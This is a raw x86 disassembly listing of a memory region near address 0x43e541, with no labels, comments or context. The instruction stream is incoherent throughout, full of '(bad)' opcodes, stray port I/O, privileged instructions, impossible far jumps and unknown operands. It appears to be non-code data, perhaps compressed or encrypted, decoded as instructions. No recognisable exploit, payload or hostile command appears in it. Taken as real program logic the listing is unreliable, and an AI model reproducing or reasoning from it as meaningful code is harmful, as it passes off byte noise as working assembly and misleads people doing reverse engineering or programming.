  43e541:	xor    dl,BYTE PTR [ecx-0x30]
  43e544:	inc    esp
  43e545:	es imul ebx,esi,0xbf6719c6
  43e54c:	mov    ds:0x7622001d,al
  43e551:	inc    edi
  43e552:	ins    DWORD PTR es:[edi],dx
  43e553:	xchg   esi,eax
  43e554:	(bad)  
  43e555:	sbb    al,0x64
  43e557:	(bad)  
  43e558:	lea    eax,[edx]
  43e55a:	add    BYTE PTR [edi],ah
  43e55c:	jae    0x43e59b
  43e55e:	arpl   WORD PTR [ebp-0x7a95d863],bx
  43e564:	test   DWORD PTR [ecx],esi
  43e566:	push   eax
  43e567:	xchg   BYTE PTR [ecx+0x2],ch
  43e56a:	add    ch,ah
  43e56c:	ja     0x43e5af
  43e56e:	arpl   WORD PTR [ebp-0x49],di
  43e571:	sbb    al,0x5d
  43e573:	test   BYTE PTR [ecx+0x36],ah
  43e576:	imul   edi,DWORD PTR [ebx+0x76],0x53a5ff12
  43e57d:	ss cmp eax,0x55
  43e583:	add    BYTE PTR [eax],al
  43e585:	push   esi
  43e586:	sbb    eax,0x1c442d6d
  43e58b:	popa   
  43e58c:	ds jns 0x43e525
  43e58f:	(bad)  
  43e590:	and    eax,0x50513692
  43e595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e596:	imul   esi,DWORD PTR es:[esi],0x46621c2e
  43e59d:	jns    0x43e5c5
  43e59f:	jmp    DWORD PTR ds:0x8503692
  43e5a5:	mov    esp,DWORD PTR [ebx]
  43e5a7:	push   0x15
  43e5a9:	jno    0x43e59f
  43e5ab:	std    
  43e5ac:	cmp    BYTE PTR [ebp+ebx*1+0x74],ah
  43e5b0:	sbb    al,0x52
  43e5b2:	sbb    eax,0xd96d006d
  43e5b7:	pop    esp
  43e5b8:	push   edi
  43e5b9:	mov    WORD PTR [ebx],es
  43e5bb:	pushf  
  43e5bc:	add    DWORD PTR [ebx-0x19],esp
  43e5bf:	jae    0x43e618
  43e5c1:	jne    0x43e5b7
  43e5c3:	arpl   WORD PTR [edi-0x5d],bp
  43e5c6:	push   ebp
  43e5c7:	pop    ebp
  43e5c8:	arpl   WORD PTR [eax+0x2c023203],sp
  43e5ce:	cmc    
  43e5cf:	pusha  
  43e5d0:	outs   dx,BYTE PTR ds:[esi]
  43e5d1:	inc    eax
  43e5d2:	dec    edx
  43e5d3:	popa   
  43e5d4:	outs   dx,BYTE PTR ds:[esi]
  43e5d5:	xor    dl,dh
  43e5d7:	outs   dx,BYTE PTR ds:[esi]
  43e5d8:	add    BYTE PTR [edi+0x11713d03],bl
  43e5de:	in     al,0x6b
  43e5e0:	push   edx
  43e5e1:	xor    esi,esp
  43e5e3:	jae    0x43e5e5
  43e5e5:	fld    DWORD PTR [ecx+eax*2]
  43e5e8:	outs   dx,BYTE PTR ds:[esi]
  43e5e9:	add    BYTE PTR [eax],al
  43e5eb:	add    BYTE PTR [eax],al
  43e5ed:	add    al,ah
  43e5ef:	out    0x69,eax
  43e5f1:	jae    0x43e5f4
  43e5f3:	out    0x73,al
  43e5f5:	push   edx
  43e5f6:	icebp  
  43e5f7:	in     eax,0x73
  43e5f9:	add    BYTE PTR [edi+0x3],cl
  43e5fc:	inc    esp
  43e5fd:	jb     0x43e5ec
  43e5ff:	jmp    0xe8474a40
  43e604:	(bad)  
  43e605:	inc    DWORD PTR [edx]
  43e607:	add    al,0x3e
  43e609:	imul   ebp,DWORD PTR [eax-0x509ab60e],0xd4ffffea
  43e613:	add    BYTE PTR [ebp+0x61],al
  43e616:	dec    esp
  43e617:	pop    eax
  43e618:	popa   
  43e619:	jb     0x43e5bb
  43e61b:	jmp    0xd9eb5278
  43e620:	jo     0x43e679
  43e622:	fadd   QWORD PTR [edx]
  43e624:	jmp    0x43e628
  43e626:	pusha  
  43e627:	fisttp WORD PTR [esi+ebp*2+0x65]
  43e62b:	jecxz  0x43e693
  43e62d:	fs jno 0x43e636
  43e630:	cmp    al,BYTE PTR [ecx]
  43e632:	jne    0x43e614
  43e634:	es je  0x43e675
  43e637:	push   es
  43e638:	cmp    ebx,DWORD PTR [esi+0x12]
  43e63b:	cli    
  43e63c:	sub    eax,0x23b54664
  43e641:	je     0x43e65b
  43e643:	cdq    
  43e644:	cld    
  43e645:	push   edx
  43e646:	es out 0x4d,al
  43e649:	sub    eax,0x6c281747
  43e64e:	or     DWORD PTR [ecx+0x31fc],ebx
  43e654:	add    BYTE PTR [eax],al
  43e656:	add    BYTE PTR [esp+ebx*2+0x27],dh
  43e65a:	je     0x43e615
  43e65c:	(bad)  
  43e65d:	sub    ah,BYTE PTR [ecx-0x17]
  43e660:	ror    DWORD PTR [ebp+0x67],cl
  43e663:	rcr    DWORD PTR [ebx+0x5875d1fc],1
  43e669:	cs ja  0x43e631
  43e66c:	ja     0x43e6c0
  43e66e:	arpl   di,ax
  43e670:	xchg   edx,eax
  43e671:	and    dh,BYTE PTR [edi-0x5a]
  43e674:	xchg   edx,eax
  43e675:	and    DWORD PTR [edx-0x6c],ebp
  43e678:	(bad)  
  43e679:	aaa    
  43e67a:	outs   dx,BYTE PTR ds:[esi]
  43e67b:	nop
  43e67c:	je     0x43e67a
  43e67e:	ret    0x5875
  43e681:	cs ja  0x43e629
  43e684:	aaa    
  43e685:	inc    edx
  43e686:	arpl   WORD PTR [ecx-0x5a88d8a0],cx
  43e68c:	jp     0x43e6bc
  43e68e:	pop    edi
  43e68f:	nop
  43e690:	fwait
  43e691:	cld    
  43e692:	lds    esi,FWORD PTR [ebp-0x28]
  43e695:	sub    eax,0x4b4f6577
  43e69a:	imul   esp,DWORD PTR [ebp-0x14],0x2d
  43e69e:	je     0x43e6ce
  43e6a0:	cmp    eax,DWORD PTR ds:[eax]
  43e6a3:	jne    0x43e6d9
  43e6a5:	std    
  43e6a6:	cmp    al,0x47
  43e6a8:	repnz xor esi,DWORD PTR [ecx+esi*1+0x46]
  43e6ad:	sub    eax,0x12024774
  43e6b2:	cmp    eax,0x4202730
  43e6b7:	out    0x2,eax
  43e6b9:	xor    al,BYTE PTR es:[eax]
  43e6bc:	add    BYTE PTR [eax],al
  43e6be:	add    BYTE PTR [eax],al
  43e6c0:	and    dh,BYTE PTR [edx]
  43e6c2:	adc    ecx,DWORD PTR [eax+0x16]
  43e6c5:	xor    ebx,edi
  43e6c7:	xor    DWORD PTR [ebx+ebp*1],ecx
  43e6ca:	das    
  43e6cb:	and    eax,0x3e71a20
  43e6d0:	hlt    
  43e6d1:	add    esp,DWORD PTR [eax]
  43e6d3:	xor    esp,DWORD PTR [edi+eiz*1]
  43e6d6:	shr    DWORD PTR [edi],cl
  43e6d8:	xor    BYTE PTR [edx+ecx*8],bl
  43e6db:	fist   WORD PTR ss:[ecx-0x40]
  43e6df:	daa    
  43e6e0:	jne    0x43e6e4
  43e6e2:	mov    ebx,0xd11da003
  43e6e7:	xor    eax,0x52b330d6
  43e6ec:	fisub  DWORD PTR [esi]
  43e6ee:	fwait
  43e6ef:	cs mov eax,0xcf2cb536
  43e6f5:	and    eax,0x55d12cb6
  43e6fa:	out    0x3,eax
  43e6fc:	push   0x0
  43e6fe:	mov    ch,0x28
  43e700:	xchg   esp,eax
  43e701:	inc    ecx
  43e702:	xchg   ebp,eax
  43e703:	sub    dl,al
  43e705:	mov    WORD PTR ss:[edx-0x6a],cs
  43e709:	sub    esp,DWORD PTR [ebx+edi*1+0x18102a4]
  43e710:	mov    ebx,0x86548227
  43e715:	daa    
  43e716:	push   ebp
  43e717:	cmp    esp,DWORD PTR [edi+0x56374b23]
  43e71d:	inc    edi
  43e71e:	dec    edi
  43e71f:	push   ebp
  43e720:	jne    0x43e724
  43e722:	dec    eax
  43e723:	add    al,BYTE PTR [eax]
  43e725:	add    BYTE PTR [eax],al
  43e727:	add    BYTE PTR [eax],al
  43e729:	xor    esp,DWORD PTR [edi]
  43e72b:	dec    edx
  43e72c:	dec    ebp
  43e72d:	gs daa 
  43e72f:	dec    ecx
  43e730:	dec    ecx
  43e731:	push   esi
  43e732:	sub    eax,DWORD PTR [eax]
  43e734:	sub    al,0x89
  43e736:	push   ebx
  43e737:	add    cl,bh
  43e739:	je     0x43e777
  43e73b:	arpl   WORD PTR [esi],cx
  43e73d:	xor    al,0x1e
  43e73f:	imul   ebx,DWORD PTR [edx],0x1063475a
  43e745:	jno    0x43e76f
  43e747:	(bad)  
  43e748:	cmp    bl,BYTE PTR [edx+0x23]
  43e74b:	dec    ebp
  43e74c:	or     al,0x5d
  43e74e:	push   eax
  43e74f:	pop    edi
  43e750:	or     eax,0xf143214a
  43e755:	and    DWORD PTR [edx],eax
  43e757:	add    BYTE PTR [esi+0x76],dh
  43e75a:	cmp    esi,DWORD PTR [eax-0x34]
  43e75d:	dec    eax
  43e75e:	push   edx
  43e75f:	outs   dx,BYTE PTR ds:[esi]
  43e760:	into   
  43e761:	xchg   ebp,eax
  43e762:	pop    ds
  43e763:	ins    DWORD PTR es:[edi],dx
  43e764:	fcmovb st,st(2)
  43e766:	sbb    DWORD PTR [ebp-0x3c],esp
  43e769:	nop
  43e76a:	add    al,BYTE PTR [eax]
  43e76c:	sahf   
  43e76d:	ja     0x43e7b0
  43e76f:	arpl   WORD PTR [ebp-0x659bdc5b],si
  43e775:	or     DWORD PTR [edi+edi*1-0x4c],0xffffff8a
  43e77a:	sbb    ch,BYTE PTR [ecx-0x65]
  43e77d:	(bad)  
  43e77e:	ss ja  0x43e76a
  43e781:	jbe    0x43e731
  43e783:	(bad)  
  43e784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e785:	popw   ds
  43e787:	push   0xffffffb5
  43e789:	dec    esi
  43e78a:	sbb    al,0x63
  43e78c:	mov    BYTE PTR [eax],al
  43e78e:	add    BYTE PTR [eax],al
  43e790:	add    BYTE PTR [eax],al
  43e792:	push   edx
  43e793:	push   esi
  43e794:	imul   edx,DWORD PTR [edx-0x6effe7a5],0x75634177
  43e79e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e79f:	and    esp,DWORD PTR [edx+edi*1+0x42]
  43e7a3:	dec    esp
  43e7a4:	aas    
  43e7a5:	push   esp
  43e7a6:	lods   eax,DWORD PTR ds:[esi]
  43e7a7:	sbb    ch,BYTE PTR [ecx+0x5b]
  43e7aa:	sahf   
  43e7ab:	ss ja  0x43e7d8
  43e7ae:	nop
  43e7af:	das    
  43e7b0:	push   0x0
  43e7b2:	cwde   
  43e7b3:	push   es
  43e7b4:	push   edx
  43e7b5:	add    DWORD PTR [ebx+0x335473e3],ebx
  43e7bb:	fstp   DWORD PTR [esi+ebp*2-0x6b]
  43e7bf:	fcomp  QWORD PTR [ebp+0x6f]
  43e7c2:	pop    esi
  43e7c3:	fistp  DWORD PTR [eax+0x74]
  43e7c6:	test   ebp,ebx
  43e7c8:	add    BYTE PTR gs:[eax+0x79723b06],al
  43e7cf:	fbstp  TBYTE PTR [ebx+0x65]
  43e7d2:	jl     0x43e7c4
  43e7d4:	data16 arpl WORD PTR [ecx-0xf],di
  43e7d8:	push   0x41
  43e7da:	(bad)  
  43e7db:	push   esp
  43e7dc:	imul   esp,DWORD PTR [ebp+0x7e],0x56
  43e7e0:	add    BYTE PTR [eax],al
  43e7e2:	sti    
  43e7e3:	dec    DWORD PTR [ebx+0x6f]
  43e7e6:	inc    ebx
  43e7e7:	fisubr DWORD PTR [eax+esi*2+0x2c]
  43e7eb:	icebp  
  43e7ec:	pusha  
  43e7ed:	jbe    0x43e824
  43e7ef:	fistp  DWORD PTR [edi+eiz*2+0x29]
  43e7f3:	push   ebp
  43e7f4:	pop    ecx
  43e7f5:	ins    BYTE PTR es:[edi],dx
  43e7f6:	add    BYTE PTR [eax],al
  43e7f8:	add    BYTE PTR [eax],al
  43e7fa:	add    BYTE PTR [ecx],cl
  43e7fc:	in     al,0x4e
  43e7fe:	add    BYTE PTR [ebx],ah
  43e800:	(bad)  
  43e801:	cmp    BYTE PTR [esi+esi*1-0xc],ah
  43e805:	push   0x74
  43e807:	clc    
  43e808:	frstor [edx+0x65]
  43e80b:	add    cl,BYTE PTR [edi+0x6a]
  43e80e:	imul   ecx,DWORD PTR [edx],0xfb656bd8
  43e814:	jecxz  0x43e880
  43e816:	add    BYTE PTR [ebx-0x1a91bf00],bl
  43e81c:	repnz pusha 
  43e81e:	popa   
  43e81f:	lock xlat BYTE PTR ds:[ebx]
  43e821:	jno    0x43e888
  43e823:	(bad)  
  43e825:	pop    edx
  43e826:	jne    0x43e7c6
  43e828:	fnsave [ebx+0x79]
  43e82b:	cwde   
  43e82c:	loope  0x43e898
  43e82e:	arpl   WORD PTR [ebp+0x47],si
  43e831:	sub    esi,DWORD PTR [eax+0x69]
  43e834:	in     al,dx
  43e835:	xor    DWORD PTR [eax],eax
  43e837:	jne    0x43e864
  43e839:	add    cl,BYTE PTR [ebp+0x58]
  43e83c:	cmc    
  43e83d:	push   eax
  43e83e:	arpl   WORD PTR [esi-0x12],dx
  43e841:	xor    DWORD PTR [edi+0x49],esp
  43e844:	repnz aas 
  43e846:	arpl   WORD PTR [esi-0x8],ax
  43e849:	xor    DWORD PTR [edi+0x25],esp
  43e84c:	adc    eax,0xfa316e25
  43e851:	and    BYTE PTR [ebp+esi*2+0x7],ch
  43e855:	add    al,0x3d
  43e857:	or     dl,BYTE PTR [ebx]
  43e859:	arpl   WORD PTR cs:[edi],ax
  43e85c:	mov    ch,0x51
  43e85e:	je     0x43e860
  43e860:	add    BYTE PTR [eax],al
  43e862:	add    BYTE PTR [eax],al
  43e864:	pop    es
  43e865:	add    ah,BYTE PTR [esi]
  43e867:	popa   
  43e868:	es push es
  43e86a:	and    DWORD PTR [ebx+0x7],esi
  43e86d:	shr    BYTE PTR [eax],cl
  43e86f:	ja     0x43e82a
  43e871:	mov    esi,0xc2e75d31
  43e876:	sub    al,0x74
  43e878:	ror    ch,cl
  43e87a:	dec    eax
  43e87b:	imul   eax,esi,0xc77321b6
  43e881:	shr    BYTE PTR [eax],cl
  43e883:	ja     0x43e836
  43e885:	mov    dh,0x31
  43e887:	pop    ebp
  43e888:	mov    edx,0x8dca742c
  43e88e:	dec    ebp
  43e88f:	add    BYTE PTR [ebp+0x56],dh
  43e892:	add    eax,DWORD PTR [ecx-0x70]
  43e895:	xchg   DWORD PTR [ecx+0x63],edx
  43e898:	xchg   esi,eax
  43e899:	mov    ?,WORD PTR [edx]
  43e89b:	addr16 mov eax,ds:0x3882
  43e89f:	arpl   WORD PTR [esi-0x7a98cd84],ax
  43e8a5:	daa    
  43e8a6:	outs   dx,BYTE PTR es:[esi]
  43e8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e8a9:	jp     0x43e8cc
  43e8ab:	ins    BYTE PTR es:[edi],dx
  43e8ac:	jne    0x43e8b0
  43e8ae:	popf   
  43e8af:	add    eax,0x57531f40
  43e8b4:	push   esi
  43e8b5:	and    eax,0x2e5a365c
  43e8ba:	push   eax
  43e8bb:	inc    eax
  43e8bc:	push   esi
  43e8bd:	xor    eax,0x325a3646
  43e8c2:	xor    ebp,DWORD PTR [ebx]
  43e8c4:	pop    ebx
  43e8c5:	push   ebp
  43e8c6:	dec    eax
  43e8c7:	daa    
  43e8c8:	add    BYTE PTR [eax],al
  43e8ca:	add    BYTE PTR [eax],al
  43e8cc:	add    BYTE PTR [ecx+0x2],dl
  43e8cf:	sub    al,0x5
  43e8d1:	xor    bl,BYTE PTR [eax]
  43e8d3:	adc    BYTE PTR [eax],dh
  43e8d5:	sbb    ah,BYTE PTR [ebx]
  43e8d7:	adc    esp,DWORD PTR [ecx]
  43e8d9:	cmp    BYTE PTR [ebx],ch
  43e8db:	push   ss
  43e8dc:	xor    BYTE PTR [esi],dl
  43e8de:	pop    ss
  43e8df:	ss sub al,0x26
  43e8e2:	or     ebp,DWORD PTR cs:[ebx]
  43e8e5:	add    al,0x18
  43e8e7:	and    al,0x3c
  43e8e9:	and    al,0x2
  43e8eb:	jmp    0x924:0xf4333604
  43e8f2:	push   ebp
  43e8f3:	rcr    BYTE PTR [edi],1
  43e8f5:	jne    0x43e8f9
  43e8f7:	and    eax,DWORD PTR [ebx]
  43e8f9:	test   al,0x34
  43e8fb:	shl    BYTE PTR [ebx],1
  43e8fd:	jmp    0xad73ad43
  43e902:	and    esi,DWORD PTR [esi-0x4adc5ad5]
  43e908:	and    al,0xde
  43e90a:	add    bh,BYTE PTR [eax+0x3]
  43e90d:	xor    BYTE PTR [eax+esi*4],0x33
  43e911:	rol    DWORD PTR [ebx-0x7a],0x34
  43e915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e916:	sbb    edx,DWORD PTR [ebp-0x7ee697e0]
  43e91c:	das    
  43e91d:	xchg   esi,eax
  43e91e:	sub    dl,BYTE PTR [ebx+0x2e027552]
  43e924:	add    edx,DWORD PTR [eax+0x34]
  43e927:	xor    BYTE PTR [ebx],0x81
  43e92a:	push   esp
  43e92b:	add    BYTE PTR [edx+ebx*2+0x7a5f25],cl
  43e932:	add    BYTE PTR [eax],al
  43e934:	add    BYTE PTR [eax],al
  43e936:	push   ebp
  43e937:	out    0x68,eax
  43e939:	push   edi
  43e93a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e93b:	and    eax,0x57715578
  43e940:	jmp    FWORD PTR [ecx]
  43e942:	stos   DWORD PTR es:[edi],eax
  43e943:	xor    DWORD PTR [eax+0x55],esi
  43e946:	xor    BYTE PTR [eax],bl
  43e948:	arpl   WORD PTR [eax-0x7b],cx
  43e94b:	and    eax,0x1a804848
  43e950:	add    BYTE PTR [ecx+0x306de779],ah
  43e956:	sub    DWORD PTR [esi],0x1a680848
  43e95c:	inc    esp
  43e95d:	or     BYTE PTR [ebp+0x49],ah
  43e960:	add    BYTE PTR [eax],ch
  43e962:	xor    eax,0x2e393f54
  43e967:	xlat   BYTE PTR ds:[ebx]
  43e968:	sub    eax,0x6c1672d7
  43e96d:	jmp    0x194368e8
  43e972:	push   esi
  43e973:	cs push 0x691d5a1b
  43e979:	fist   WORD PTR [ebx-0x743298bc]
  43e97f:	xor    eax,0x5199cc70
  43e984:	add    BYTE PTR [ecx+esi*2+0x52],ah
  43e988:	pop    edi
  43e989:	mov    ebp,0xcc63389e
  43e98e:	popf   
  43e98f:	xor    al,0x63
  43e991:	stos   DWORD PTR es:[edi],eax
  43e992:	xchg   edi,eax
  43e993:	inc    ebp
  43e994:	gs mov edx,0x916d4792
  43e99a:	add    BYTE PTR [eax],al
  43e99c:	add    BYTE PTR [eax],al
  43e99e:	add    ch,al
  43e9a0:	add    al,BYTE PTR [eax]
  43e9a2:	cdq    
  43e9a3:	ja     0x43e9d6
  43e9a5:	jb     0x43e92e
  43e9a7:	imul   esi,DWORD PTR [edx],0x2e4c806e
  43e9ad:	bound  eax,QWORD PTR [eax]
  43e9af:	repz add esp,DWORD PTR [edi+0x1]
  43e9b3:	xor    ecx,0x65
  43e9b6:	jae    0x43ea34
  43e9b8:	in     eax,dx
  43e9b9:	pusha  
  43e9ba:	outs   dx,BYTE PTR ds:[esi]
  43e9bb:	and    cl,0x38
  43e9be:	add    BYTE PTR [ecx+0x40614ffe],dh
  43e9c4:	(bad)  
  43e9c5:	ds gs inc eax
  43e9c8:	inc    edx
  43e9c9:	push   0x69
  43e9cb:	inc    edx
  43e9cc:	pop    es
  43e9cd:	inc    esi
  43e9ce:	jne    0x43e9f9
  43e9d0:	loopne 0x43ea2e
  43e9d2:	jb     0x43ea37
  43e9d4:	(bad)  
  43e9d5:	jbe    0x43e9d7
  43e9d7:	pop    esp
  43e9d8:	jecxz  0x43ea4d
  43e9da:	push   0x7466d75d
  43e9df:	or     DWORD PTR [ebp+0x70],0x6b077f61
  43e9e6:	push   edi
  43e9e7:	mov    WORD PTR [ebx],es
  43e9e9:	scas   eax,DWORD PTR es:[edi]
  43e9ea:	add    BYTE PTR [edi+0x36],bl
  43e9ed:	inc    esp
  43e9ee:	gs push 0x62657407
  43e9f4:	jecxz  0x43ea61
  43e9f6:	jne    0x43ea69
  43e9f8:	push   ecx
  43e9f9:	add    BYTE PTR [eax],al
  43e9fb:	aas    
  43e9fc:	add    ecx,DWORD PTR [ebx+0x48]
  43e9ff:	and    BYTE PTR [eax],cl
  43ea01:	ins    BYTE PTR es:[edi],dx
  43ea02:	add    BYTE PTR gs:[eax],al
  43ea05:	add    BYTE PTR [eax],al
  43ea07:	add    BYTE PTR [eax+0x8],al
  43ea0a:	inc    ebx
  43ea0b:	gs inc ebp
  43ea0d:	push   edx
  43ea0e:	add    BYTE PTR [eax],al
  43ea10:	adc    eax,DWORD PTR [ebx]
  43ea12:	push   eax
  43ea13:	popa   
  43ea14:	adc    bl,bl
  43ea16:	cmp    eax,0x3d073a69
  43ea1b:	js     0x43ea1d
  43ea1d:	or     BYTE PTR [esi+0x73],ah
  43ea20:	xor    eax,0x1c5765da
  43ea25:	add    ebx,DWORD PTR [edx]
  43ea27:	add    edi,ebp
  43ea29:	(bad)  
  43ea2a:	imul   eax,DWORD PTR [ebx+0x75],0xc24a2c7e
  43ea31:	cdq    
  43ea32:	cld    
  43ea33:	mov    WORD PTR [ebp-0x77],?
  43ea36:	sbb    eax,0x2b8c9d74
  43ea3b:	test   DWORD PTR [bp+di+0x6927],ecx
  43ea40:	adc    DWORD PTR [eax-0x168a6704],0xee5d7422
  43ea4a:	and    DWORD PTR [edi+0x68],ebp
  43ea4d:	inc    eax
  43ea4e:	xor    BYTE PTR [ebx+0x46],ah
  43ea51:	dec    ecx
  43ea52:	and    ebx,DWORD PTR [ebp+0x58]
  43ea55:	in     al,dx
  43ea56:	dec    eax
  43ea57:	add    BYTE PTR [ebp+0x53],dh
  43ea5a:	add    edx,DWORD PTR [ebx+0x47]
  43ea5d:	cmp    eax,0xec506a4f
  43ea62:	sbb    al,0x5f
  43ea64:	and    eax,0x750042f6
  43ea69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ea6a:	add    ecx,DWORD PTR [ebp+0x0]
  43ea6d:	add    BYTE PTR [eax],al
  43ea6f:	add    BYTE PTR [eax],al
  43ea71:	sub    DWORD PTR [ebx],ecx
  43ea73:	cmp    eax,0x4b07256b
  43ea78:	aas    
  43ea79:	jne    0x43ea27
  43ea7b:	cld    
  43ea7c:	dec    edi
  43ea7d:	adc    al,0xad
  43ea7f:	and    al,0x47
  43ea81:	push   es
  43ea82:	push   es
  43ea83:	dec    esi
  43ea84:	dec    esp
  43ea85:	and    bl,BYTE PTR [ecx+0x6b7554fc]
  43ea8b:	and    esi,DWORD PTR [ebp+ebx*8+0x72]
  43ea8f:	sub    eax,0x1fc9cc44
  43ea94:	pop    ebp
  43ea95:	loope  0x43eafb
  43ea97:	cs ja  0x43ea44
  43ea9a:	fwait
  43ea9b:	cld    
  43ea9c:	sub    eax,0x74238b75
  43eaa1:	int    0x5a
  43eaa3:	sbb    BYTE PTR [eax+esi*4+0x73],ah
  43eaa7:	sub    BYTE PTR [ebx-0x5d],ah
  43eaaa:	add    dl,BYTE PTR [esi-0x4deb63d4]
  43eab0:	add    esp,DWORD PTR [ebp+0x2]
  43eab3:	mov    bh,0x24
  43eab5:	mov    eax,ds:0x991fa81a
  43eaba:	inc    eax
  43eabb:	mov    BYTE PTR [edx],ah
  43eabd:	nop
  43eabe:	xor    DWORD PTR [ebx-0x65e56fdc],ecx
  43eac4:	add    ebx,DWORD PTR [edx+0x3]
  43eac7:	xchg   esi,eax
  43eac8:	das    
  43eac9:	arpl   WORD PTR [ecx+0x54],ax
  43eacc:	xor    al,0x3f
  43eace:	cmp    esi,DWORD PTR [edx]
  43ead0:	add    al,0x3a
  43ead2:	add    dh,BYTE PTR [edi]
  43ead4:	and    eax,0x0
  43ead9:	add    BYTE PTR [ecx+0x1a],ah
  43eadc:	and    DWORD PTR ds:0x2d291e5f,ebp
  43eae2:	pop    ecx
  43eae3:	pop    ds
  43eae4:	sub    DWORD PTR ds:0x41a1f4e,esp
  43eaea:	pusha  
  43eaeb:	add    edx,DWORD PTR [esi]
  43eaed:	xor    BYTE PTR [ebx],ah
  43eaef:	inc    ecx
  43eaf0:	adc    al,0x34
  43eaf2:	aas    
  43eaf3:	inc    ebx
  43eaf4:	out    0x3,eax
  43eaf6:	sub    BYTE PTR [edx],al
  43eaf8:	aaa    
  43eaf9:	and    eax,0x251c1a21
  43eafe:	or     DWORD PTR [ecx],esp
  43eb00:	rcpps  xmm0,XMMWORD PTR ds:0x754f061f
  43eb07:	add    dl,BYTE PTR [esi]
  43eb09:	dec    esp
  43eb0a:	sub    DWORD PTR [ebp+0x28],ecx
  43eb0d:	push   esp
  43eb0e:	mov    edx,0xd927cad4
  43eb13:	add    ah,BYTE PTR [esi]
  43eb15:	add    esi,DWORD PTR [eax-0x1edf55c6]
  43eb1b:	cmp    al,0xba
  43eb1d:	daa    
  43eb1e:	fstp   DWORD PTR [edi]
  43eb20:	mov    ch,0x53
  43eb22:	stos   BYTE PTR es:[edi],al
  43eb23:	cs iret 
  43eb25:	dec    esi
  43eb26:	jne    0x43eb2a
  43eb28:	add    bh,ch
  43eb2a:	jbe    0x43eb13
  43eb2c:	push   0x6a455dbc
  43eb31:	lea    esi,[edx-0x4d7b95e3]
  43eb37:	sbb    edi,DWORD PTR [edi]
  43eb39:	fwait
  43eb3a:	jnp    0x43eb6c
  43eb3c:	push   ecx
  43eb3d:	jmp    0x43eb42
  43eb42:	add    BYTE PTR [esi+0x4],dh
  43eb45:	call   FWORD PTR [ecx-0x7293dea2]
  43eb4b:	mov    ch,0x2a
  43eb4d:	arpl   WORD PTR [edx-0x699cd1bb],cx
  43eb53:	jbe    0x43eb8c
  43eb55:	dec    eax
  43eb56:	sub    al,0x3d
  43eb58:	ss sub eax,0x6c20db1b
  43eb5e:	inc    ebp
  43eb5f:	jno    0x43eb69
  43eb61:	add    BYTE PTR [esi],ah
  43eb63:	jb     0x43eb93
  43eb65:	push   ebx
  43eb66:	cmp    ch,BYTE PTR [edx+0x14]
  43eb69:	dec    edx
  43eb6a:	dec    eax
  43eb6b:	call   0x2:0x28314321
  43eb72:	sbb    dl,BYTE PTR [edx-0x5be48cb9]
  43eb78:	(bad)  
  43eb79:	sub    DWORD PTR ds:0x100164d,eax
  43eb7f:	jno    0x43eb68
  43eb81:	push   0x65175635
  43eb86:	xor    al,0x6a
  43eb88:	sbb    DWORD PTR [edx-0x5],eax
  43eb8b:	arpl   WORD PTR [ecx],sp
  43eb8d:	add    BYTE PTR [edx],cl
  43eb8f:	jno    0x43eb78
  43eb91:	push   0x502e921a
  43eb96:	fist   DWORD PTR [ecx-0x655488d6]
  43eb9c:	inc    ebx
  43eb9d:	push   0xffffffc2
  43eb9f:	jnp    0x43ebcf
  43eba1:	add    cl,bh
  43eba3:	jbe    0x43eb8a
  43eba5:	push   0x0
  43ebaa:	add    BYTE PTR [eax],al
  43ebac:	pop    ds
  43ebad:	repnz pop esp
  43ebaf:	popa   
  43ebb0:	or     BYTE PTR ds:0xd3ff6e41,al
  43ebb6:	pop    eax
  43ebb7:	outs   dx,BYTE PTR ds:[esi]
  43ebb8:	aas    
  43ebb9:	add    eax,0x0
  43ebbe:	cmp    ebp,DWORD PTR [edi-0x17]
  43ebc1:	frstor [eax+0x6e]
  43ebc4:	cmc    
  43ebc5:	shl    DWORD PTR [eax+0x61],cl
  43ebc8:	nop
  43ebc9:	fdiv   DWORD PTR [ecx+0x65]
  43ebcc:	sbb    al,0x0
  43ebce:	inc    eax
  43ebcf:	add    bh,cl
  43ebd1:	fiadd  WORD PTR [eax+0x6e]
  43ebd4:	cmc    
  43ebd5:	shl    DWORD PTR [eax+0x61],cl
  43ebd8:	jo     0x43ebb2
  43ebda:	jno    0x43ec41
  43ebdc:	scas   eax,DWORD PTR es:[edi]
  43ebdd:	add    ebx,DWORD PTR [ebx+0x75]
  43ebe0:	xlat   BYTE PTR ds:[ebx]
  43ebe2:	jae    0x43ec5d
  43ebe4:	int3   
  43ebe5:	push   DWORD PTR [esi]
  43ebe7:	add    BYTE PTR [edi+0x256e40dd],bl
  43ebed:	repnz pusha 
  43ebef:	popa   
  43ebf0:	xor    bh,dl
  43ebf2:	jno    0x43ec59
  43ebf4:	mov    esi,esp
  43ebf6:	(bad)  
  43ebf7:	call   FWORD PTR [edx]
  43ebf9:	(bad)  
  43ebfa:	cmp    dh,BYTE PTR [edx+0x79]
  43ebfd:	fbstp  TBYTE PTR [ebx+0x65]
  43ec00:	pop    edi
  43ec01:	repnz imul esp,DWORD PTR [ebp+0x6d],0x546e46db
  43ec09:	in     eax,0x6b
  43ec0b:	outs   dx,DWORD PTR ds:[esi]
  43ec0c:	jle    0x43ebed
  43ec0e:	imul   eax,DWORD PTR [eax],0x0
  43ec11:	add    BYTE PTR [eax],al
  43ec13:	add    BYTE PTR [eax],al
  43ec15:	test   bh,bh
  43ec17:	cmp    cl,BYTE PTR [edi+ebx*2+0x37]
  43ec1b:	inc    esp
  43ec1c:	inc    esi
  43ec1d:	outs   dx,BYTE PTR ds:[esi]
  43ec1e:	fisub  WORD PTR [ebx+edx*2+0x48]
  43ec22:	icebp  
  43ec23:	pusha  
  43ec24:	outs   dx,BYTE PTR ds:[esi]
  43ec25:	cmp    edi,edi
  43ec27:	jo     0x43ec2a
  43ec29:	jne    0x43ec93
  43ec2b:	sub    BYTE PTR [esi-0x24],ch
  43ec2e:	arpl   WORD PTR [ebx],bx
  43ec30:	inc    edx
  43ec31:	(bad)  
  43ec32:	int3   
  43ec33:	and    DWORD PTR [ecx-0x58],eax
  43ec36:	jb     0x43ec70
  43ec38:	cs jne 0x43ebf7
  43ec3b:	and    BYTE PTR [ebx+0x66],ah
  43ec3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
